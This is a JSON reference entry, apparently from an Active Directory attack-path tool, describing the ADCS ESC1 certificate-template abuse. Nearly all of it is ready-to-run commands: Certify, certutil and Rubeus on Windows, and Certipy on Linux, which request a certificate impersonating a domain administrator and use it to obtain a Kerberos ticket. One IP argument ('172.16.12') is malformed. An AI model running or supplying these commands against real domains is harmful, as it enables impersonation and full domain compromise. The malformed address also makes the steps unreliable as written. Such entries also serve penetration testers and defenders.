{
    "ADCSESC1": {
        "meaning": "This edge indicates that the principal has permission to enroll on one or more certificate templates, allowing them to specify an alternate subject name and use the certificate for authentication. They also have enrollment permission for an enterprise CA with the necessary templates published.",
        "common": "",
        "windows": {
            "Certify": [
                {
                    "order": 1,
                    "command": "Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:\"ESC1\" /altname:ForestRootDA /sid:S-1-5-21-2697957641-2271029196-387917394-500",
                    "description": "Request certificate enrollment with alternate subject name"
                },
                {
                    "order": 2,
                    "command": "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx",
                    "description": "Convert certificate to PFX format"
                },
                {
                    "order": 3,
                    "command": "klist purge",
                    "description": "Purge all Kerberos tickets from memory"
                },
                {
                    "order": 4,
                    "command": "Rubeus asktgt /user:forestrootda /domain:forestroot.com /certificate:cert.pfx /password:asdf /ptt",
                    "description": "Request TGT using certificate for authentication"
                }
            ]
        },
        "linux": {
            "Certipy": [
                {
                    "order": 1,
                    "command": "certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC1 -upn administrator@corp.local",
                    "description": "Request certificate enrollment specifying target principal to impersonate"
                },
                {
                    "order": 2,
                    "command": "certipy auth -pfx administrator.pfx -dc-ip 172.16.12",
                    "description": "Authenticate using certificate to request TGT"
                }
            ]
        }
    }
}
